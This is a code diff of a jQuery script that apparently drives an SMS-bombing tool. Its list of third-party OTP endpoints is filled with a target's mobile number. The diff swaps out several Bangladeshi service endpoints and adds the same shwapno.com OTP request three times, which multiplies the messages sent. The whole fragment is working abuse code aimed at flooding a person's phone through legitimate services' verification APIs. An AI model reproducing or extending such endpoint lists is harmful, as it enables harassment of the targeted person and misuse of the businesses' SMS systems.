@@ -13,17 +13,16 @@ $(document).ready(() => {
 
             const APIS = [
                 {
-                    method: "POST",
-                    url: `http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-${mobile}/operator-Robi/send`,
-                },
-                {
-                    method: 'POST',
-                    url: "https://api.bongo-solutions.com/auth/api/login/send-otp",
-                    body: `msisdn=88${mobile}&operator=all`
+                    method: 'GET',
+                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
                 },
                 {
                     method: 'GET',
-                    url: `https://www.bioscopelive.com/bn/login/send-otp?phone=88"+number+"&operator=bd-otp`
+                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
+                },
+                {
+                    method: 'GET',
+                    url: `https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO=${mobile}&countryPhoneCode=%2B88`
                 },
                 {
                     method: 'GET',
